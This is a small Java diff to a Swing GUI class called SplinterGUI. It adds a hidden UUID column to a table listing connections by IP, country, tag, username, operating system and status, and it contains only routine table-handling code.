@@ -23,7 +23,7 @@ import java.util.Objects;
 
 public class SplinterGUI {
 
-    private final String[] column = {"IP", "Country", "Tag", "Username", "Operating System", "Status"};
+    private final String[] column = {"UUID", "IP", "Country", "Tag", "Username", "Operating System", "Status"};
     private JPanel mainPanel;
     private JTable connectionsTable;
     private JFrame mainGUI;
@@ -133,6 +133,8 @@ public class SplinterGUI {
         gridBagConstraints.fill = GridBagConstraints.BOTH;
         TableModel tableModel = new TableModel(column);
         connectionsTable = new JTable(tableModel);
+        connectionsTable.removeColumn(connectionsTable.getColumnModel().getColumn(0));
+
         JScrollPane tableScroll = new JScrollPane(connectionsTable);
         connectionsTable.setFocusable(false);
         connectionsTable.getTableHeader().setReorderingAllowed(false);
